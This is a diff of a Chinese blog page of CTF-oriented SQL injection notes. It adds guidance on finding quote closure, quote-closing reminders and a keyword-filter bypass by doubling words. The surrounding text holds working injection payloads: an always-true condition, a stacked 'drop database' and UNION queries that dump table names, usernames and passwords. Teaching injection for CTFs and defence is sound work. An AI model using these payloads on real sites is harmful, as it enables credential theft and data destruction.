@@ -261,7 +261,7 @@
 </ol>
 <h2 id="判断是否存在SQL注入漏洞"><a href="#判断是否存在SQL注入漏洞" class="headerlink" title="判断是否存在SQL注入漏洞"></a>判断是否存在SQL注入漏洞</h2><p>对于一个陌生网站，判断其是否存在SQL注入漏洞：<br>输入框内输入一个英文单引号’并上传，然后F12，进入Network网络部分查看Response<br>若提示SQL语法存在错误，则该网站大概率存在SQL注入漏洞。</p>
 <h2 id="GET型SQL注入漏洞"><a href="#GET型SQL注入漏洞" class="headerlink" title="GET型SQL注入漏洞"></a>GET型SQL注入漏洞</h2><p>我们在提交网页内容的时候，主要分为GET方法，POST方法，GET方法提交的内容会显示在网页的URL上，<br>通过对URL连接进行构造，可以获得超出权限的信息内容。</p>
-<p>注入内容：<br><code>&#39; or 1=1#</code><br>或<code>&#39; or 1=1 -- </code><br>(此处英文单引号的作用是使条件闭合，在语法上形成完整的SQL语句，而<code>#</code>或<code>-- </code>的作用是注释掉后面的多余内容)</p>
+<p>注入内容：<br><code>&#39; or 1=1#</code><br>或<code>&#39; or 1=1 -- </code><br>(此处英文单引号的作用是使条件闭合，在语法上形成完整的SQL语句，而<code>#</code>或<code>-- </code>的作用是注释掉后面的多余内容)<br><strong>注意注入点是字符型时后台sql语句中注入点用单引号包裹，构造payload时要注意闭合单引号，若注入点是整型则无需加单引号！！！！！！</strong></p>
 <ul>
 <li>检索隐藏数据</li>
 <li>修改应用程序（语句）逻辑</li>
@@ -273,8 +273,8 @@
 <ol>
 <li>通过注入语句修改查询条件<code>以获取隐藏信息</code>：<br>应注入<code>xxx&#39; -- </code>或<code>xxx&#39;#</code>来实现这一点</li>
 <li>查询出所有数据信息：<br>注入<code>xxx&#39; or 1=1#</code>或<code>xxx&#39; or 1=1 -- </code>来干掉sql语句中的where条件</li>
-<li>删库<br>注入<code>xxx&#39;;drop database 数据库名;#</code><br>或<code>xxx&#39;;drop database 数据库名; -- </code><br>（前提：服务端连接数据库时允许执行多条sql语句）</li>
-<li>拿到所有用户名和密码并登陆系统<br>用到：<strong>联合注入（union attack)</strong>!<ol>
+<li>删库<br>注入<code>xxx&#39;;drop database 数据库名;#</code><br>或<code>xxx&#39;;drop database 数据库名; -- </code><br>（前提：服务端连接数据库时允许执行多条sql语句）<br><strong>注意注入点是字符型时后台sql语句中注入点用单引号包裹，构造payload时要注意闭合单引号，若注入点是整型则无需加单引号！！！！！！</strong></li>
+<li>拿到所有用户名和密码并登陆系统<br>用到：<strong>联合注入（union attack）</strong>!<ol>
 <li>拿到数据库database<br>database()返回当前连接的数据库是哪个</li>
 <li>拿到表table</li>
 <li>拿到表里的字段</li>
@@ -283,9 +283,14 @@
 </li>
 </ol>
 <p>接下来把union后面的1，2，3等改为一些需要的函数，如user(),database()等<br>例：<code>select * from products union select 1,user(),3,version(),database();</code><br><strong>注意：</strong><br><strong>1.改的时候注意对应字段的数据类型！要与函数的返回类型对应！</strong><br><strong>2.根据语句语法在最后加#注释多余内容防止报错！</strong><br>(格式如：输入框里输gifts’ union select 1,2,3,4#)</p>
-<p>在输入框里输入<code>gifts&#39; union select 1,database(),3,4#</code>即可拿到数据库名。<br>拿到数据库名后，接下来拿表名：<br>在输入框里输入<code>1&#39; union select 1,database(),table_name,4 from information_schema.tables where table_schema=database()#</code>得到表名。<br>接下来分析表字段(假设有一张表，名为user)：<br>输入<code>1&#39; union select 1,database(),column_name,4 from information_schema.columns where table_name=&#39;user&#39; and table_schema=database()#</code><br>指出当前数据库中的名为user的表中的字段名<br>假设有字段名为username和password<br>则输入<code>1&#39;union select 1,username,password,4 from user #</code><br>可以拿到用户名和密码！！！</p>
+<p>在输入框里输入<code>gifts&#39; union select 1,database(),3,4#</code>即可拿到数据库名。<br>拿到数据库名后，接下来拿表名：<br>在输入框里输入<code>1&#39; union select 1,database(),table_name,4 from information_schema.tables where table_schema=database()#</code>得到表名。<br>接下来分析表字段(假设有一张表，名为user)：<br>输入<code>1&#39; union select 1,database(),column_name,4 from information_schema.columns where table_name=&#39;user&#39; and table_schema=database()#</code><br>指出当前数据库中的名为user的表中的字段名<br>假设有字段名为username和password<br>则输入<code>1&#39;union select 1,username,password,4 from user #</code><br>可以拿到用户名和密码！！！<br><strong>注意注入点是字符型时后台sql语句中注入点用单引号包裹，构造payload时要注意闭合单引号，若注入点是整型则无需加单引号！！！！！！</strong></p>
 <h2 id="POST型SQL注入漏洞"><a href="#POST型SQL注入漏洞" class="headerlink" title="POST型SQL注入漏洞"></a>POST型SQL注入漏洞</h2><p>提交的内容在url上没有显示，是post型与get型的区别之一<br>方法：提交，F12看“网络”Network部分，再点提交，找php文件！<br>首先看到<code>请求URL</code>,即是post注入的地址，<br>再找到最下面form data,里面有post注入的参数（字段）</p>
 <p>判断一下注入类型：<strong>并不是所有的注入都要加单引号闭合！</strong><br>如果注入位置的数据类型为整型则不用加单引号</p>
+<h2 id="如何判断SQL注入闭合方式："><a href="#如何判断SQL注入闭合方式：" class="headerlink" title="如何判断SQL注入闭合方式："></a>如何判断SQL注入闭合方式：</h2><p>首先我们可以知道，sql的注入可以分为数字类型，字符类型。</p>
+<ul>
+<li>方法1：<br>首先我们可以使用\(转义字符)来判断SQL注入的闭合方式。<br>原理，当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。<br><code>分析报错信息：看\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。</code></li>
+<li>方法2：<br>首先尝试：<br>?id&#x3D;1’<br>?id&#x3D;1”<br>结果一：如果都报错<br>判断闭合符为：<code>整形闭合</code>。<br>结果二：如果单引号报错，双引号不报错。<br>继续尝试<br>?id&#x3D;1’ –-+<br>结果1：无报错<br>判断闭合符为：<code>单引号闭合</code>。<br>结果2：报错<br>判断闭合符<code>可能</code>为：单引号加括号。<br>结果三：如果单引号不报错，双引号报错。<br>继续尝试<br>?id&#x3D;1” -–+<br>结果1：结果无报错<br>判断闭合符为：<code>双引号闭合</code>。<br>结果2：报错<br>判断闭合符<code>可能</code>为：双引号加括号。<br><code>注意：这里的括号不一定只有一个，闭合符里是允许多个括号组合成闭合符的，具体要判段有多少个括号，可以使用二分法来快速判断。</code><br>原文链接：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46634468/article/details/120480080" >https://blog.csdn.net/weixin_46634468/article/details/120480080 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
 <h2 id="SQL注入测试的一般步骤"><a href="#SQL注入测试的一般步骤" class="headerlink" title="SQL注入测试的一般步骤"></a>SQL注入测试的一般步骤</h2><p>1、 找到注入点<br>   单引号、两个单引号、and 1&#x3D;1、and 1&#x3D;2、or 1&#x3D;1等尝试，找到对查询结果有影响的参数<br>2、闭合语句<br>       or 1&#x3D;1 –+<br>       ’ or 1&#x3D;1 –+<br>       “ or 1&#x3D;1 –+<br>       ) or 1&#x3D;1 –+<br>       ‘) or 1&#x3D;1 –+<br>       ‘)) or 1&#x3D;1 –+<br>       “) or 1&#x3D;1 –+<br>       “)) or 1&#x3D;1 –+<br>       –+用于注释sql语句中的后引号，–后的+号主要作用是提供一个空格，sql语句单行注释后需有空格，+会被解码为空格；注释符号还有#和内联注释&#x2F;<em>…</em>&#x2F;<br>3、带入语句进行爆破<br>      1）order by 确认几个字段<br>            例：语句为?id&#x3D;1 order by 1<br>            有回显，改为?id&#x3D;1 order by 2<br>            有回显，改为?id&#x3D;1 order by 3<br>            无回显，证明有两个字段<br>      2）联合查询确定回显位置<br>            union select 1,2<br>      3）爆数据库版本、数据库名称、用户名称等<br>            union select @@version,database(),user()<br>      4）爆所有数据库<br>            union select group_concat(schema_name) from information_schema.schemata<br>      5）爆所有表<br>            union select group_concat(table_name) from information_schema.tables where table_schema &#x3D;’&lt;数据库名&gt;’<br>      6）爆对应表的所有字段<br>            union select group_concat(column_name) from information_schema.columns where table_name&#x3D;’&lt;表名&gt;’<br>      7）爆表中数据<br>            union select group_concat(&lt;字段1&gt;,’ ‘,&lt;字段2&gt;) from &lt;表名&gt;<br><strong>（group_cat是用来表示连接的，将里面的参数连接成字符串）</strong></p>
 <p>知识链接：sql语句group_cat是ctf中常用语句：</p>
 <table>
@@ -309,7 +314,7 @@
 </tr>
 <tr>
 <td>TABLE_SCHEMA</td>
-<td>表示表所属的数据库名称；</td>
+<td>表示表所属的数据库名称</td>
 </tr>
 <tr>
 <td>TABLE_NAME</td>
@@ -321,7 +326,7 @@
 </tr>
 <tr>
 <td>TABLE_SCHEMA</td>
-<td>表示表所属的数据库名称；</td>
+<td>表示表所属的数据库名称</td>
 </tr>
 <tr>
 <td>TABLE_NAME</td>
@@ -332,6 +337,8 @@
 <td>表示字段名</td>
 </tr>
 </tbody></table>
+<h2 id="常见的sql注入题目的巧妙方法"><a href="#常见的sql注入题目的巧妙方法" class="headerlink" title="常见的sql注入题目的巧妙方法"></a>常见的sql注入题目的巧妙方法</h2><p>1、双写绕过<br>双写绕过的原理是后台利用正则匹配到敏感词将其替换为空。即如果过滤了select，我们输入123select456 后会被检测出敏感词，最后替换得到的字符串由123select456 —&gt; 123456。这种过滤的绕过也很简单即双写select即可，如：selselectect  —&gt; select ，进行一次这样的过滤就双写，两次就三写以此类推。</p>
+<p>参考文章链接：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/125444401" >https://blog.csdn.net/qq_51295677/article/details/125444401 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <h2 id="sql注入例题"><a href="#sql注入例题" class="headerlink" title="sql注入例题"></a>sql注入例题</h2><h3 id="1-BUU-SQL-COURSE-1"><a href="#1-BUU-SQL-COURSE-1" class="headerlink" title="1.BUU SQL COURSE 1"></a>1.BUU SQL COURSE 1</h3><p>题解：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43785509/article/details/127914154?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~OPENSEARCH~Rate-1-127914154-blog-122814021.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~OPENSEARCH~Rate-1-127914154-blog-122814021.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=1%EF%BC%9B" >https://blog.csdn.net/weixin_43785509/article/details/127914154?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-1-127914154-blog-122814021.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-1-127914154-blog-122814021.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=1； <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3>
             </div>
@@ -402,7 +409,7 @@
                 <div class="post-toc-wrap">
     <div class="post-toc">
         <div style="font-size: 1.3rem;margin-top: 0; margin-bottom: 0.8rem; transition-duration: 0.1s;"><i class="fa-solid fa-list"></i> <strong>Contents</strong></div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E7%AE%80%E4%BB%8B"><span class="nav-text">mysql简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9BSQL%E8%AF%AD%E6%B3%95"><span class="nav-text">一些SQL语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">判断是否存在SQL注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">GET型SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E7%94%A8"><span class="nav-text">应用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">POST型SQL注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E7%9A%84%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4"><span class="nav-text">SQL注入测试的一般步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BE%8B%E9%A2%98"><span class="nav-text">sql注入例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-BUU-SQL-COURSE-1"><span class="nav-text">1.BUU SQL COURSE 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2"><span class="nav-text">2.</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E7%AE%80%E4%BB%8B"><span class="nav-text">mysql简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9BSQL%E8%AF%AD%E6%B3%95"><span class="nav-text">一些SQL语法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">判断是否存在SQL注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">GET型SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E7%94%A8"><span class="nav-text">应用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST%E5%9E%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">POST型SQL注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%ADSQL%E6%B3%A8%E5%85%A5%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-text">如何判断SQL注入闭合方式：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E7%9A%84%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4"><span class="nav-text">SQL注入测试的一般步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84sql%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B7%A7%E5%A6%99%E6%96%B9%E6%B3%95"><span class="nav-text">常见的sql注入题目的巧妙方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BE%8B%E9%A2%98"><span class="nav-text">sql注入例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-BUU-SQL-COURSE-1"><span class="nav-text">1.BUU SQL COURSE 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2"><span class="nav-text">2.</span></a></li></ol></li></ol>
     </div>
 </div>
             </div>
